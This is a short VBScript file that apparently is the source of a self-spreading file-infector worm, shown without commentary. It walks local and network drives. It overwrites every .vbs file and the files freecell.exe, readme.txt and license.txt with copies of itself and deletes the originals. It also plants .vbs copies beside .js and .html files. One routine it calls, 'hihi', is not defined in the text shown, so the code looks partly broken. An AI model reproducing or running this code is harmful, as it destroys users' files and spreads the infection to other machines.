haha()
Sub haha()
On Error Resume Next
Dim d, dc, s, fso, haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
hihi (d.Path & "\")
End If
Next
haha = s
End Sub
Sub hehe(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "vbs") Then
Set f = fso.GetFile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbs")
fso.deletefile(f1.path)
End If
If (s = "freecell.exe") Or (s = "readme.txt") or (s = "license.txt") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path)
fso.deletefile(f1.path)
End If
If (ext = "js") Or (ext = "html") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbs")
End If
Next
End Sub